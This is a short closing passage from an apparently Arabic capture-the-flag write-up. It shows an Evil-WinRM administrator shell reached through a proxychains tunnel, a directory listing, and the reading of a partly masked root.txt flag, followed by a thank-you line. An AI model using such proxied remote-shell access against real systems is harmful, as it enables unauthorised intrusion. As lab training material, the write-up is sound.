[proxychains] Strict chain  ...  127.0.0.1:1080  ...  127.0.0.1:5985  ...  OK
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir


    Directory: C:\Users\Administrator\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         2/16/2025   2:34 AM           2304 Microsoft Edge.lnk
-a----          4/8/2025   5:05 PM             32 root.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
5b150cc71e974d*******************
*Evil-WinRM* PS C:\Users\Administrator\Desktop> 
```
وشكرا لكم على القراءة :)
